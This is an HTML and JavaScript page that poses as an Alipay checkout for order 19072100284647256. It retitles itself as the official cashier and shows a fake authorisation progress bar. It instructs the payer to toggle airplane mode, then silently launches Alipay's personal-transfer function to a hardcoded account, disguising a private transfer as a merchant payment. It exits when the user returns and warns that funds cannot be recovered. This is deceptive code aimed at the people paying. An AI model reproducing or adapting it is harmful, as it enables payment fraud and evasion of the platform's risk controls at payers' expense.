



<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>在线支付 - 网上支付 安全快速！</title>
    <meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" name="viewport">
    <meta content="yes" name="apple-mobile-web-app-capable">
    <meta content="black" name="apple-mobile-web-app-status-bar-style">
    <meta content="telephone=no" name="format-detection">
    <link href="QRCode.css" rel="stylesheet" />
    <link href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" />
    <script src="https://cdn.staticfile.org/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script src="https://gw.alipayobjects.com/as/g/h5-lib/alipayjsapi/3.1.1/alipayjsapi.inc.min.js"></script>
    <script type="text/javascript" src="qrcode.min.js"></script>
    <script type="text/javascript" src="common.js"></script>
</head>
<body>
    <div style="width: 100%; text-align: center;font-family:微软雅黑;background-color:white;min-height:1000px;">
        <div id="panelWrap" class="panel-wrap">
            <div class="panel panel-easypay">
                <div class="panel-heading">
                    <div class="row">
                        <div class="col-xs-12 text-center">
                            <img src="alipay.png" class="img-responsive center-block" />
                        </div>
                    </div>
                </div>
                <div class="panel-body" style="background:#fff url('/Content/images/wave.png') top center repeat-x">
                    <h3>
                        <small>订单号：19072100284647256</small>
                    </h3>
                    <div class="money">
                        <span class="price">
                            <span class="price">0.98</span>
                        </span>
                        <span class="currency">元</span>
                        <h4>
                            <small style="color:red;">
                                请按照“付款步骤”引导安全付款
                            </small>
                        </h4>
                    </div>

                        <a href="javascript:openAlipay()" class="btn btn-primary btn-lg btn-block" style="font-size:32px;" id="alipay">立即支付</a>
                </div>
                <div class="panel-footer">
                    <span><small></small><span id="countdown" class="warning" style="color:red;font-size:1.2em">_</span></span>
                </div>
                <div class="panel-footer text-left">
                    <p style="color: #040460;">【支付协议】</p>
                    <p style="padding-left:10px;">
                        1.请在规定的时间内完成付款，超时请放弃并重新下单<br />
                        2.请核对正确的金额，切勿修改<br />
                        3.请勿保存二维码或者支付链接重复支付
                    </p>
                    <p style="color: #FF508B;">*警告：请必须按照以上要求进行转账，如不按规定，您的资金将无法找回。</p>
                </div>
            </div>
        </div>
    </div>
    <script>
        var waitInterval;
        var waitCount = 10;
        var clickCount = 0;
        var dot = [".", "..", "..."];

        openAlipay = function () {
            window.location.href = 'alipays://platformapi/startapp?appId=60000029&showLoading=YES&url=https%3a%2f%2f1izheng.github.io%2fxpage%2fzz.html';
        };

        function goPay() {
            if (navigator.onLine) {
                AlipayJSBridge.call('alert', {
                    title: '网络还是通的，必须先开启手机“飞行模式”再点立即支付',
                    button: '明白了，去开启'
                }, function (e) {
                });
            }
            else {
                AlipayJSBridge.call('alert', {
                    title: '恭喜！跳转3秒后再“关闭飞行模式”重开网络付款，请耐心等待',
                    button: '知道了，跳转吧'
                }, function (e) {
                    try {
                        var a = {
                            actionType: "scan",
                            u: "2088432362471091",
                            a: "0.98",
                            m: "",
                            biz_data: {
                                s: "money",
                                u: "2088432362471091",
                                a: "0.98",
                                m: ""
                            }
                        }
                    } catch (b) {
                        returnApp()
                    }
                    AlipayJSBridge.call("startApp", {
                        appId: "20000123",
                        param: a
                    }, function (a) {
                        if (a.errorCode == 4) {
                            window.location.href = "alipays://platformapi/startapp?appId=10000007&qrcode=" + encodeURI(window.location.href);
                        }

                    });
                });
            }
        }

        InitQrcode = function () {
            $('#qrcode_load').remove();
            var qrcode = new QRCode('qrcode', {
                text: "http://liveshark.free.idcfengye.com/alipay/zzpay6/19072100284647256",
                width: 256,
                height: 256,
                colorDark: '#000000',
                colorLight: '#ffffff',
                correctLevel: QRCode.CorrectLevel.H
            });
        };

        //带天数的倒计时
        var timer = null;
        var times =2560806.278;
        countDown = function () {
            timer = setInterval(function () {
                if (times <= 0) {
                    clearInterval(timer);
                    window.location.reload();
                }
                else {
                    var day = 0,
                        hour = 0,
                        minute = 0,
                        second = 0;//时间默认值
                    if (times > 0) {
                        day = Math.floor(times / (60 * 60 * 24));
                        hour = Math.floor(times / (60 * 60)) - (day * 24);
                        minute = Math.floor(times / 60) - (day * 24 * 60) - (hour * 60);
                        second = Math.floor(times) - (day * 24 * 60 * 60) - (hour * 60 * 60) - (minute * 60);
                    }

                    if (day <= 0) day = ''; else day = day + '天';
                    if (hour <= 0) hour = ''; else hour = hour + '时';
                    if (minute <= 0) minute = ''; else minute = minute + '分';
                    $("#countdown").text(day + hour + minute + second + '秒');
                    if (Math.ceil(times) % 3 == 0) {
                        $.ajax({
                            type: "POST",
                            async: true,
                            url: "/order/query/19072100284647256",
                            contentType: "application/x-www-form-urlencoded;charset=utf-8",
                            data: {},
                            success: function (rdata) {
                                if (rdata == "success") {
                                    if ("http://www.baidu.com" == "")
                                        window.location.reload();
                                    else
                                        window.location.href = "http://www.baidu.com";
                                }
                                else if (rdata == "timeout") {
                                    window.location.reload();
                                }
                                else {
                                    console.log(rdata);
                                }
                            }
                        });
                    }
                }
                times--;
            }, 1000);
        }();

        function changeState() {
            clearInterval(waitInterval);
            $("#alipay").attr("href", "javascript:goPay()").text("已开“飞行模式”，立即支付").removeClass("btn-success").addClass("btn-primary");
            //goPay();
        }

        function waitSecond() {
            $("#alipay").text("支付宝授权中(" + Math.ceil(100-waitCount) + "%)" + dot[waitCount%3]);
            waitCount--;
            if (waitCount <= 0)
                changeState();
        }

        function returnApp() {
            AlipayJSBridge.call('exitApp', { closeActionType: "exitSelf", animated: false });
        }

        window.onload = function () {
            if (isAlipay()) {
                document.addEventListener('AlipayJSBridgeReady', function () {
                    AlipayJSBridge.call('setTitle', {
                        title: '支付宝收银台',
                    });
                    AlipayJSBridge.call('hideOptionMenu');
                    document.addEventListener("pageResume", function (a) {
                        returnApp();
                    });
                    document.addEventListener("resume", function (a) {
                        //returnApp();
                    });
                });
                waitInterval = setInterval('waitSecond()', 200);
            }
            else if (!isMobile()) {
                InitQrcode();
            }
        }
    </script>
</body>
</html>
